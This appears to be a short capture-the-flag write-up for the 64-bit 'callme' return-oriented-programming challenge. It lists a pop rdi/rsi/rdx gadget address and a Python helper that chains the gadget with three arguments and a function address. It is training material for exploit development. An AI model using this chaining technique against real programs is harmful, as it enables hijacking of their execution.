# callme - 64bit

Again, the 64-bit version is very similar to the [32-bit exploit](../32-bit/README.md)

In the same way, we will require gadgets to put the parameters in the correct places.

Luckily we also have the same combined gadget:

```
0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret
```

The order of the function call will be slightly different to the 32-bit version as the parameters need to be in the registers before the function call is made

Therefore, the function call code looks like this:
```python
def call_function_x86(function):
    payload = b""

    # pop rdi ; pop rsi ; pop rdx ; ret
    payload += pop_gadget 
    payload += p64(1)
    payload += p64(2)
    payload += p64(3)
    payload += function
    return payload
```

This function is repeated for each of the required methods.